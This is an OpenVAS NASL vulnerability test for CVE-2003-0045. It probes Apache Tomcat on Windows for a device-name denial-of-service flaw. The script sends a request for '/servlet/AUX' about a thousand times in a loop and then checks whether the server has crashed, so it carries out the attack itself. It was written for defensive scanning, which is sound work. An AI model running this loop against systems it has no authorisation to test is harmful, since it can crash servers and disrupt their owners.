###############################################################################
# OpenVAS Vulnerability Test
#
# Tomcat servlet engine MS/DOS device names denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# See also script 10930 http_w98_devname_dos.nasl
#
# References:
# Date: Fri, 11 Oct 2002 13:36:55 +0200
# From:"Olaf Schulz" <olaf.schulz@t-systems.com>
# To:cert@cert.org, bugtraq@securityfocus.com, vulnwatch@vulnwatch.org
# Subject: Apache Tomcat 3.x and 4.0.x: Remote denial-of-service vulnerability

CPE = "cpe:/a:apache:tomcat";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11150");
  script_version("2019-05-10T11:41:35+0000");
  script_tag(name:"last_modification", value:"2019-05-10 11:41:35 +0000 (Fri, 10 May 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2003-0045");
  script_name("Tomcat servlet engine MS/DOS device names denial of service");
  script_category(ACT_KILL_HOST);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("gb_apache_tomcat_consolidation.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/tomcat/http/detected");

  script_tag(name:"solution", value:"Upgrade your Apache Tomcat web server to version 4.1.10.");

  script_tag(name:"summary", value:"It was possible to freeze or crash Windows or the web server
  by reading a thousand of times a MS/DOS device through Tomcat servlet engine, using a file name
  like /examples/servlet/AUX");

  script_tag(name:"impact", value:"A cracker may use this flaw to make your system crash
  continuously, preventing you from working properly.");

  script_tag(name:"affected", value:"Apache Tomcat 3.3

  Apache Tomcat 4.0.4

  All versions prior to 4.1.x may be affected as well.

  Apache Tomcat 4.1.10 (and probably higher) is not affected.

  Microsoft Windows 2000

  Microsoft Windows NT may be affected as well.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( http_is_dead( port:port ) ) exit( 0 );
soc = http_open_socket( port );
if( ! soc ) exit( 0 );

start_denial();

# We should know where the servlets are
url = "/servlet/AUX";
req = http_get( item:url, port:port );

for( i = 0; i <= 1000; i++ ) {

  send( socket:soc, data:req );
  http_close_socket( soc );
  soc = http_open_socket( port );
  if( ! soc ) {
    sleep( 1 );
    soc = http_open_socket( port );
    if( ! soc )
      break;
  }
}

if( soc ) http_close_socket( soc );
alive = end_denial();

if( ! alive || http_is_dead( port:port ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
